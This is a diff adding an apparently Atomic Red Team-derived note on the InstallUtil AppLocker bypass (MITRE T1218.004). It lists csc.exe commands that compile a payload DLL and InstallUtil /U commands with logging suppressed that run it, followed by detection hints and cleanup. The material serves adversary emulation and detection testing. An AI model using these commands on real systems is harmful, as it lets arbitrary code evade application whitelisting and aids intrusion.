@@ -1,0 +1,45 @@
+# InstallUtil AppLocker Bypass
+# Source: Atomic Red Team (T1218.004)
+# https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md
+
+# MITRE ATT&CK: T1218.004 - System Binary Proxy Execution: InstallUtil
+# InstallUtil.exe is a command-line utility that allows you to install and
+# uninstall server resources by executing the installer components in specified assemblies.
+
+# The technique abuses the Uninstall() method which runs when /U flag is passed.
+# This can bypass application whitelisting since InstallUtil.exe is a signed Microsoft binary.
+
+# ============================================================================
+# ATOMIC TEST: Compile and Execute
+# ============================================================================
+
+# Step 1: Create C# source file with installer class
+# The [RunInstaller(true)] attribute marks this as an installer component
+# The Uninstall() method executes arbitrary code
+
+# Step 2: Compile with csc.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:%TEMP%\payload.dll payload.cs
+
+# Or 64-bit:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:%TEMP%\payload.dll payload.cs
+
+# Step 3: Execute via InstallUtil /U (triggers Uninstall method)
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\payload.dll
+
+# Or 64-bit:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\payload.dll
+
+# ============================================================================
+# DETECTION
+# ============================================================================
+# - Monitor for InstallUtil.exe execution with /U flag
+# - Watch for InstallUtil.exe spawning child processes
+# - Look for InstallUtil.exe loading DLLs from unusual locations (Temp, Downloads, etc.)
+# - Sysmon Event ID 1 (Process Create) with InstallUtil.exe as parent
+
+# ============================================================================
+# CLEANUP
+# ============================================================================
+del %TEMP%\payload.dll
+del %TEMP%\payload.InstallLog
+
